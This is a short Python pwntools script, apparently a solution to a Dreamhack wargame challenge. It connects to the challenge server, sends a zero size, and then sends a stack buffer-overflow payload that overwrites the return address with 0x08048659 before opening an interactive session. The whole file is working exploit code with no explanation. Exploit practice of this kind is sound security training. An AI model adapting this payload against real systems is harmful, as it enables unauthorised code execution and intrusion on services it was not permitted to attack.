from pwn import *

connection = remote('host1.dreamhack.games' , 23672) # 연결하는 명령어

buf = b'0'*256
p_size = b'0'*4
rbp = b'0'*4
ret_addr = p32(0x08048659)
tmp_size = 0

pload = buf+p_size+rbp+ret_addr

connection.sendlineafter("Size: ", str(tmp_size)) 
print(pload)
connection.sendlineafter("Data: ",pload)

connection.interactive()